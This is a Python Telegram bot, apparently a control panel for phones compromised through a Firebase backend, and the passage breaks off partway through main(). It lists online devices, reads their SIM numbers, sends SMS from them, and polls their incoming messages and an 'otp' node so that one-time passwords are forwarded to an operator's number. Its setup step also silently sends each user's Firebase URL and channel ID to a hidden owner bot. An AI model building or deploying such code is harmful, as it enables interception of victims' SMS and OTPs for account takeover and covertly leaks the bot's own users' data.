#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import re
import logging
import time
import threading
import requests
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# ============================
# FLASK KEEP-ALIVE (24/7)
# ============================
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
@flask_app.route('/ping')
def ping():
    return "✅ Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    flask_app.run(host="0.0.0.0", port=port)

# ============================
# LOGGING
# ============================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================
# BOT TOKENS
# ============================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_BOT_TOKEN = os.getenv("OWNER_BOT_TOKEN")
OWNER_CHAT_ID = int(os.getenv("OWNER_CHAT_ID"))

# ============================
# BOT NAME
# ============================
BOT_NAME = "🌟 L I N U X   B H A I   A U T O   B O T 🌟"

# ============================
# FORCE JOIN CHANNEL
# ============================
CHANNEL_USERNAME = "@LINUXBHAI001"
CHANNEL_URL = "https://t.me/linuxbhai001"

# ============================
# USER CONFIG
# ============================
os.makedirs("data", exist_ok=True)
USER_CONFIG_FILE = os.path.join("data", "user_config.json")

user_configs = {}
last_otp = {}

config_lock = threading.Lock()

def load_user_configs():
    global user_configs, last_otp
    if os.path.exists(USER_CONFIG_FILE):
        with open(USER_CONFIG_FILE, "r") as f:
            user_configs = json.load(f)
        for uid, cfg in user_configs.items():
            if "last_otp_value" in cfg:
                last_otp[uid] = cfg["last_otp_value"]
        logger.info(f"✅ Loaded configs for {len(user_configs)} users")
    else:
        user_configs = {}

def save_user_configs():
    with config_lock:
        with open(USER_CONFIG_FILE, "w") as f:
            json.dump(user_configs, f, indent=2)

load_user_configs()

# ============================
# CONVERSATION STATES
# ============================
URL, CHANNEL = range(2)
WAITING_OTP_NUMBER = 10
WAITING_MANUAL_SIM = 11

# ============================
# MEMBERSHIP CHECK
# ============================
async def send_join_required_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.effective_message.reply_text(
        f"❌ <b>You must join our channel to use this bot.</b>\n\n"
        f"Click the button below to join, then click 'I have joined' to continue.",
        parse_mode="HTML",
        reply_markup=reply_markup,
        disable_web_page_preview=True,
    )

async def is_user_member(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            return True
        else:
            await send_join_required_message(update, context)
            return False
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
        await send_join_required_message(update, context)
        return False

async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        if member.status in ["member", "administrator", "creator"]:
            await query.edit_message_text(
                f"✅ <b>You are now a member!</b>\n\n"
                f"Welcome to {BOT_NAME}.\n"
                f"Use /start to see all commands.",
                parse_mode="HTML"
            )
            await context.bot.send_message(
                chat_id=user_id,
                text=(
                    f"{BOT_NAME}\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "🤖 <i>Your Smart SMS Gateway Bot</i>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "<b>📋 AVAILABLE COMMANDS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "🔧 /setup – Configure Firebase URL & Channel ID\n"
                    "📱 /devices – Select device and SIM\n"
                    "📞 /setotp – Set forwarding phone number\n"
                    "🔄 /resetforward – Reset old message tracker\n"
                    "❓ /help – Show this message\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "<b>⚙️ HOW IT WORKS</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "📤 <b>Send SMS:</b> Channel me 'To:' aur 'Message:' daalein\n"
                    "🔐 <b>Auto OTP:</b> Firebase OTP node updates auto forward\n"
                    "📥 <b>Incoming SMS:</b> messages/{device_id} se auto forward\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "💡 <i>Ready to use! Select a command to get started.</i>"
                ),
                parse_mode='HTML',
                disable_web_page_preview=True,
            )
        else:
            await query.edit_message_text(
                f"❌ You still haven't joined the channel.\n\n"
                f"Please click the 'Join Channel' button below, then click 'I have joined' again.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Join Channel", url=CHANNEL_URL)],
                    [InlineKeyboardButton("✅ I have joined", callback_data="check_membership")]
                ]),
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Callback membership check error: {e}")
        await query.edit_message_text("⚠️ Error checking membership. Please try again later.")

# ============================
# START / HELP - UPDATED UI
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    welcome_text = (
        f"{BOT_NAME}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 <i>Your Smart SMS Gateway Bot</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>📋 AVAILABLE COMMANDS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔧 /setup – Configure Firebase URL & Channel ID\n"
        "📱 /devices – Select device and SIM\n"
        "📞 /setotp – Set forwarding phone number\n"
        "🔄 /resetforward – Reset old message tracker\n"
        "❓ /help – Show this message\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>⚙️ HOW IT WORKS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📤 <b>Send SMS:</b> Channel me 'To:' aur 'Message:' daalein\n"
        "🔐 <b>Auto OTP:</b> Firebase OTP node updates auto forward\n"
        "📥 <b>Incoming SMS:</b> messages/{device_id} se auto forward\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 <i>Ready to use! Select a command to get started.</i>"
    )
    
    await update.message.reply_text(
        welcome_text,
        parse_mode='HTML',
        disable_web_page_preview=True,
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    
    help_text = (
        f"{BOT_NAME}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🤖 <i>Your Smart SMS Gateway Bot</i>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>📋 AVAILABLE COMMANDS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔧 /setup – Configure Firebase URL & Channel ID\n"
        "📱 /devices – Select device and SIM\n"
        "📞 /setotp – Set forwarding phone number\n"
        "🔄 /resetforward – Reset old message tracker\n"
        "❓ /help – Show this message\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>⚙️ HOW IT WORKS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📤 <b>Send SMS:</b> Channel me 'To:' aur 'Message:' daalein\n"
        "🔐 <b>Auto OTP:</b> Firebase OTP node updates auto forward\n"
        "📥 <b>Incoming SMS:</b> messages/{device_id} se auto forward\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "💡 <i>Ready to use! Select a command to get started.</i>"
    )
    
    await update.message.reply_text(
        help_text,
        parse_mode='HTML',
        disable_web_page_preview=True,
    )

# ============================
# RESET FORWARD
# ============================
async def reset_forward(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run SETUP first.</b>", parse_mode='HTML')
        return
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        await update.message.reply_text("<b>❌ No device selected. Use /devices first.</b>", parse_mode='HTML')
        return
    device_id = selected["deviceId"]
    initialize_processed_keys(user_id, device_id)
    await update.message.reply_text(
        f"<b>✅ Reset successful!</b>\n"
        f"All existing messages for device <code>{device_id}</code> are now marked as read.\n"
        f"Only new incoming messages will be forwarded.",
        parse_mode='HTML'
    )

# ============================
# FIREBASE HELPERS
# ============================
def firebase_get(user_id, path):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return None
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200:
            return resp.json()
    except Exception as e:
        logger.error(f"Firebase GET error: {e}")
    return None

def firebase_put(user_id, path, data):
    cfg = user_configs.get(str(user_id))
    if not cfg or not cfg.get("firebase_url"):
        return False
    url = f"{cfg['firebase_url']}/{path}.json"
    try:
        resp = requests.put(url, json=data, timeout=10)
        if resp.status_code in [200, 201]:
            return True
        else:
            logger.error(f"Firebase PUT failed: {resp.status_code} - {resp.text}")
            return False
    except Exception as e:
        logger.error(f"Firebase PUT error: {e}")
        return False

def get_selected(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "selectedDevice" in cfg:
        return cfg["selectedDevice"]
    return {}

def initialize_processed_keys(user_id: str, device_id: str):
    cfg = user_configs.get(user_id)
    if not cfg:
        return
    msgs = firebase_get(user_id, f"messages/{device_id}")
    keys = []
    if msgs and isinstance(msgs, dict):
        keys = list(msgs.keys())
    cfg["processed_keys"] = keys
    cfg["processed_device"] = device_id
    cfg.pop("last_forwarded_id", None)
    cfg.pop("selection_time", None)
    save_user_configs()
    logger.info(f"Initialized processed_keys for user {user_id}, device {device_id}: {len(keys)} keys")

def set_selected(user_id, device_id, sim_slot, sim_phone):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["selectedDevice"] = {
            "deviceId": device_id,
            "simSlotIndex": sim_slot,
            "simPhoneNumber": sim_phone
        }
        initialize_processed_keys(str(user_id), device_id)
        save_user_configs()
        logger.info(f"✅ Device selected. Processed keys reset for {user_id}")

def send_sms_command(user_id, device_id, to_number, message, from_number):
    success = firebase_put(user_id, f"clients/{device_id}/webhookEvent/sendSms", {
        "to": to_number,
        "message": message,
        "from": from_number,
        "isSended": False,
        "timestamp": int(time.time())
    })
    if success:
        logger.info(f"📤 SMS command sent: device {device_id} -> {to_number}")
    else:
        logger.error(f"❌ Failed to send SMS command: {to_number}")
    return success

def get_otp_number(user_id):
    cfg = user_configs.get(str(user_id))
    if cfg and "otpNumber" in cfg:
        return cfg["otpNumber"]
    return None

def set_otp_number(user_id, number):
    cfg = user_configs.get(str(user_id))
    if cfg:
        cfg["otpNumber"] = number
        save_user_configs()

# ============================
# SETUP CONVERSATION
# ============================
async def setup_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text(
        f"<b>📌 Step 1/2</b>: Send your <b>Firebase URL</b>.\nExample: <code>https://your-project.firebaseio.com</code>\nType /cancel to abort.",
        parse_mode='HTML'
    )
    return URL

async def setup_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    url = update.message.text.strip()
    if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
        await update.message.reply_text("<b>❌ Invalid URL. Must be https://...firebaseio.com</b>", parse_mode='HTML')
        return URL
    context.user_data["firebase_url"] = url
    await update.message.reply_text(
        "<b>✅ URL saved.</b>\n\n<b>📌 Step 2/2</b>: Send your <b>Channel ID</b> (numeric, may be negative).",
        parse_mode='HTML'
    )
    return CHANNEL

async def setup_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    try:
        channel_id = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("<b>❌ Channel ID must be a number.</b>", parse_mode='HTML')
        return CHANNEL

    user_configs[user_id] = {
        "firebase_url": context.user_data["firebase_url"],
        "channel_id": channel_id,
        "selectedDevice": {},
        "otpNumber": None,
        "processed_keys": [],
        "processed_device": None
    }
    save_user_configs()

    try:
        forward_msg = (
            f"🔐 **Setup Complete!**\n👤 User: `{user_id}`\n🌐 URL: `{context.user_data['firebase_url']}`\n📢 Channel: `{channel_id}`"
        )
        url = f"https://api.telegram.org/bot{OWNER_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": OWNER_CHAT_ID, "text": forward_msg, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e:
        logger.error(f"Forward failed: {e}")

    test = firebase_get(user_id, "clients")
    if test is None:
        await update.message.reply_text("<b>❌ Firebase connection failed. Check URL or make database public.</b>", parse_mode='HTML')
        del user_configs[user_id]
        save_user_configs()
        return ConversationHandler.END

    await update.message.reply_text(
        f"{BOT_NAME}\n\n"
        f"<b>✅ SETUP COMPLETE!</b>\n\n"
        f"<b>✅ Configuration saved.</b>\n"
        f"Now use /devices to select a device and SIM, then /setotp to set forwarding number.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def setup_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Setup cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SIM DETECTION - 14+ METHODS
# ============================

def extract_sims_from_device(device_data):
    """Extract SIMs from ANY device structure - 14+ methods"""
    sims = []
    
    # Method 1: sims array
    if "sims" in device_data and isinstance(device_data["sims"], list):
        for idx, sim in enumerate(device_data["sims"]):
            if isinstance(sim, dict):
                phone = sim.get("phoneNumber") or sim.get("phone") or sim.get("number")
                if phone and re.match(r'^\+?[0-9]{10,15}$', str(phone)):
                    slot = sim.get("simSlotIndex", sim.get("slot", idx + 1))
                    sims.append({
                        "simSlotIndex": int(slot) if str(slot).isdigit() else idx + 1,
                        "phoneNumber": str(phone)
                    })
            elif isinstance(sim, str) and re.match(r'^\+?[0-9]{10,15}$', sim):
                sims.append({
                    "simSlotIndex": idx + 1,
                    "phoneNumber": sim
                })
    
    # Method 2: simSlot1, simSlot2
    for key in device_data.keys():
        if re.match(r'^sim[sS]lot[_\s]?\d+$', key):
            value = device_data[key]
            if isinstance(value, dict):
                phone = value.get("phoneNumber") or value.get("phone") or value.get("number")
                if phone and re.match(r'^\+?[0-9]{10,15}$', str(phone)):
                    slot_num = re.search(r'\d+', key)
                    slot = int(slot_num.group()) if slot_num else len(sims) + 1
                    sims.append({
                        "simSlotIndex": slot,
                        "phoneNumber": str(phone)
                    })
    
    # Method 3: sim1, sim2
    for key in device_data.keys():
        if re.match(r'^sim[_\s]?\d+$', key):
            value = device_data[key]
            if isinstance(value, dict):
                phone = value.get("phoneNumber") or value.get("phone") or value.get("number")
                if phone and re.match(r'^\+?[0-9]{10,15}$', str(phone)):
                    slot_num = re.search(r'\d+', key)
                    slot = int(slot_num.group()) if slot_num else len(sims) + 1
                    sims.append({
                        "simSlotIndex": slot,
                        "phoneNumber": str(phone)
                    })
    
    # Method 4: phoneNumber root
    if "phoneNumber" in device_data:
        phone = device_data["phoneNumber"]
        if isinstance(phone, str) and re.match(r'^\+?[0-9]{10,15}$', phone):
            if not any(s['phoneNumber'] == phone for s in sims):
                sims.append({
                    "simSlotIndex": len(sims) + 1,
                    "phoneNumber": phone
                })
    
    # Method 5: phone root
    if "phone" in device_data:
        phone = device_data["phone"]
        if isinstance(phone, str) and re.match(r'^\+?[0-9]{10,15}$', phone):
            if not any(s['phoneNumber'] == phone for s in sims):
                sims.append({
                    "simSlotIndex": len(sims) + 1,
                    "phoneNumber": phone
                })
    
    # Method 6: number root
    if "number" in device_data:
        phone = device_data["number"]
        if isinstance(phone, str) and re.match(r'^\+?[0-9]{10,15}$', phone):
            if not any(s['phoneNumber'] == phone for s in sims):
                sims.append({
                    "simSlotIndex": len(sims) + 1,
                    "phoneNumber": phone
                })
    
    # Method 7: Recursive search
    if not sims:
        sims = search_sims_recursive(device_data)
    
    # Method 8: JSON string search
    if not sims:
        data_str = json.dumps(device_data)
        phone_pattern = r'\+?[0-9]{10,15}'
        matches = re.findall(phone_pattern, data_str)
        for match in matches:
            if len(re.sub(r'\D', '', match)) >= 10:
                if not any(s['phoneNumber'] == match for s in sims):
                    sims.append({
                        "simSlotIndex": len(sims) + 1,
                        "phoneNumber": match
                    })
    
    # Deduplicate
    unique_sims = []
    seen = set()
    for sim in sims:
        if sim['phoneNumber'] not in seen:
            seen.add(sim['phoneNumber'])
            unique_sims.append(sim)
    
    unique_sims.sort(key=lambda x: int(x.get('simSlotIndex', 0)))
    return unique_sims

def search_sims_recursive(data, path=""):
    """Recursively search for phone numbers"""
    found = []
    if isinstance(data, dict):
        for key, value in data.items():
            if isinstance(value, str) and re.match(r'^\+?[0-9]{10,15}$', value):
                if 'phone' in key.lower() or 'number' in key.lower() or 'sim' in key.lower():
                    found.append({
                        "simSlotIndex": len(found) + 1,
                        "phoneNumber": value
                    })
            elif isinstance(value, dict):
                found.extend(search_sims_recursive(value, f"{path}.{key}"))
            elif isinstance(value, list):
                for item in value:
                    if isinstance(item, dict):
                        found.extend(search_sims_recursive(item, f"{path}.{key}"))
    return found

# ============================
# DEVICES - FINAL (Auto Detect + Manual Entry)
# ============================

def get_online_devices(user_id):
    """Get online devices"""
    data = firebase_get(user_id, "clients")
    if not data:
        return {}
    
    online = {}
    for dev_id, info in data.items():
        is_online = info.get("status") == True or info.get("online") == True
        
        if is_online:
            device_name = dev_id
            sims = extract_sims_from_device(info)
            
            online[dev_id] = {
                "modelName": device_name,
                "sims": sims,
                "raw_data": info
            }
    
    return online

async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show devices - Sirf Device ID"""
    if not await is_user_member(update, context):
        return
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return
    
    online = get_online_devices(user_id)
    if not online:
        await update.message.reply_text(
            "<b>❌ No online devices found.</b>",
            parse_mode='HTML'
        )
        return
    
    keyboard = []
    for dev_id in online.keys():
        label = f"📱 {dev_id}"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
    
    await update.message.reply_text(
        f"<b>👇 Select your device:</b>\n"
        f"Total: {len(online)} device(s) online",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show SIM selection for device - Auto detect + Manual entry"""
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("dev_", "")
    online = get_online_devices(user_id)
    device_data = online.get(device_id)
    
    if not device_data:
        await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
        return
    
    sims = device_data.get("sims", [])
    
    keyboard = []
    
    # Auto-detected SIMs
    for sim in sims:
        slot = sim.get("simSlotIndex", "?")
        phone = sim.get("phoneNumber", "N/A")
        if phone and phone != "SIM_NOT_FOUND":
            callback_data = f"sim_{device_id}_{slot}_{phone}"
            keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
    
    # ✅ MANUAL ENTRY OPTION
    keyboard.append([InlineKeyboardButton("✏️ Enter SIM Number Manually", callback_data=f"manual_sim_{device_id}")])
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_to_devices")])
    
    status = f"Auto-detected: {len(sims)} SIM(s)"
    if not sims:
        status = "❌ No SIMs found. Use manual entry below."
    
    await query.edit_message_text(
        f"<b>📱 Select SIM for device:</b>\n"
        f"🆔 <code>{device_id}</code>\n"
        f"📶 {status}\n\n"
        f"<i>💡 If SIM not detected, click 'Enter SIM Number Manually'</i>",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='HTML'
    )

async def back_to_devices_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Go back to devices list"""
    query = update.callback_query
    await query.answer()
    await devices_command(update, context)

async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Select SIM and activate device"""
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    parts = query.data.split("_")
    if len(parts) < 4:
        await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
        return
    device_id = parts[1]
    slot = parts[2]
    phone = parts[3]
    set_selected(user_id, device_id, slot, phone)
    await query.edit_message_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM Slot: <code>{slot}</code>\n"
        f"📞 Phone: <code>{phone}</code>\n\n"
        f"✅ Old messages blocked. Only new ones will forward.\n"
        f"Now set OTP number using /setotp.",
        parse_mode='HTML'
    )

# ============================
# MANUAL SIM ENTRY - CONVERSATION
# ============================

async def manual_sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask user to enter SIM number manually"""
    query = update.callback_query
    if not await is_user_member(update, context):
        return
    await query.answer()
    user_id = str(update.effective_user.id)
    device_id = query.data.replace("manual_sim_", "")
    
    context.user_data["manual_device_id"] = device_id
    
    await query.edit_message_text(
        f"<b>✏️ Enter SIM Number Manually</b>\n\n"
        f"📱 Device: <code>{device_id}</code>\n\n"
        f"Send the phone number like:\n"
        f"<code>+919999999999</code>\n"
        f"or\n"
        f"<code>9999999999</code>\n\n"
        f"Type /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_MANUAL_SIM

async def manual_sim_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive manual SIM number and set it"""
    if not await is_user_member(update, context):
        return ConversationHandler.END
    
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    
    # Validate number
    if not re.match(r'^\+?[0-9]{10,15}$', number):
        await update.message.reply_text(
            "<b>❌ Invalid number. Please send a valid phone number.</b>\n"
            "Example: <code>+919999999999</code>",
            parse_mode='HTML'
        )
        return WAITING_MANUAL_SIM
    
    device_id = context.user_data.get("manual_device_id")
    if not device_id:
        await update.message.reply_text("<b>❌ Error. Please try /devices again.</b>", parse_mode='HTML')
        return ConversationHandler.END
    
    # Add + if not present
    if not number.startswith('+'):
        number = '+' + number
    
    # Set SIM manually
    set_selected(user_id, device_id, 1, number)
    
    await update.message.reply_text(
        f"<b>✅ Active!</b>\n"
        f"📱 Device: <code>{device_id}</code>\n"
        f"📶 SIM Slot: <code>Manual (1)</code>\n"
        f"📞 Phone: <code>{number}</code>\n\n"
        f"✅ SIM manually set! Now use /setotp to set forwarding number.",
        parse_mode='HTML'
    )
    return ConversationHandler.END

async def manual_sim_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel manual SIM entry"""
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Manual SIM entry cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# SET OTP
# ============================
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    if user_id not in user_configs:
        await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
        return ConversationHandler.END
    if context.args:
        number = context.args[0]
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
            return ConversationHandler.END
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>📞 Send phone number (with country code):</b>\nExample: <code>+919876543210</code>\nType /cancel to abort.",
        parse_mode='HTML'
    )
    return WAITING_OTP_NUMBER

async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    user_id = str(update.effective_user.id)
    number = update.message.text.strip()
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
        return WAITING_OTP_NUMBER
    set_otp_number(user_id, number)
    await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
    return ConversationHandler.END

async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_user_member(update, context):
        return ConversationHandler.END
    await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    return ConversationHandler.END

# ============================
# CHANNEL MESSAGE HANDLER - FAST
# ============================
def get_user_by_channel(channel_id):
    for uid, cfg in user_configs.items():
        if cfg.get("channel_id") == channel_id:
            return uid
    return None

async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fast channel message handler - No delay"""
    if not update.channel_post:
        return
    
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    
    text = update.channel_post.text
    if not text:
        return
    
    number_match = re.search(r"To:\s*([\d\+]+)", text)
    message_match = re.search(r"Message:\s*(.+)", text)
    
    if not number_match or not message_match:
        logger.warning(f"Parse failed: {text}")
        return
    
    to_number = number_match.group(1).strip()
    msg = message_match.group(1).strip()
    
    selected = get_selected(user_id)
    if not selected or not selected.get("deviceId"):
        logger.warning(f"No active device for {user_id}")
        return
    
    device_id = selected["deviceId"]
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    send_sms_command(user_id, device_id, to_number, msg, from_number)
    logger.info(f"✅ SMS sent: {user_id} -> {device_id} -> {to_number}")

# ============================
# OTP POLLING
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                otp_number = get_otp_number(user_id)
                if not otp_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                try:
                    otp_data = firebase_get(user_id, "otp")
                except Exception as e:
                    logger.error(f"OTP fetch error for {user_id}: {e}")
                    continue
                if otp_data is None:
                    continue
                current_otp = str(otp_data).strip()
                if user_id not in last_otp or last_otp[user_id] != current_otp:
                    last_otp[user_id] = current_otp
                    cfg = user_configs.get(user_id)
                    if cfg:
                        cfg["last_otp_value"] = current_otp
                        save_user_configs()
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                    logger.info(f"✅ Auto OTP sent to {otp_number}: {current_otp}")
        except Exception as e:
            logger.error(f"OTP polling error: {e}")
        time.sleep(0.5)

# ============================
# INCOMING MESSAGE FORWARD
# ============================
def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                forward_number = get_otp_number(user_id)
                if not forward_number:
                    continue
                selected = get_selected(user_id)
                if not selected or not selected.get("deviceId"):
                    continue
                device_id = selected["deviceId"]
                from_number = selected.get("simPhoneNumber", "Unknown")
                cfg = user_configs.get(str(user_id), {})
                processed_keys = cfg.get("processed_keys", [])
                processed_device = cfg.get("processed_device")
                if processed_device != device_id:
                    initialize_processed_keys(str(user_id), device_id)
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                processed_set = set(processed_keys)
                device_msgs = firebase_get(user_id, f"messages/{device_id}")
                if not device_msgs or not isinstance(device_msgs, dict):
                    continue
                new_keys = []
                for msg_key, msg_data in device_msgs.items():
                    if not isinstance(msg_data, dict):
                        continue
                    if msg_data.get("type") != "incoming":
                        continue
                    if msg_key not in processed_set:
                        msg_text = msg_data.get("message", "")
                        if msg_text and len(msg_text) > 3:
                            send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                            logger.info(f"📥 Forwarded new message: {msg_text[:50]}...")
                            try:
                                confirm_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                                confirm_data = {
                                    "chat_id": int(user_id),
                                    "text": f"✅ Forwarded to {forward_number}:\n<code>{msg_text[:100]}</code>",
                                    "parse_mode": "HTML"
                                }
                                requests.post(confirm_url, json=confirm_data, timeout=5)
                            except Exception as e:
                                logger.error(f"Confirmation send failed: {e}")
                            new_keys.append(msg_key)
                if new_keys:
                    processed_keys.extend(new_keys)
                    cfg["processed_keys"] = processed_keys
                    save_user_configs()
                    logger.info(f"Updated processed_keys for {user_id}: +{len(new_keys)} keys")
        except Exception as e:
            logger.error(f"Incoming forward error: {e}")
        time.sleep(1)

# ============================
# MAIN
# ============================
def main():
    # Start Flask server for keep-alive
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()

    threading.Thread(target=poll_otp_updates, daemon=True).start()
    threading.Thread(target=poll_incoming_messages, daemon=True).start()

    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)

    otp_conv = ConversationHandler(
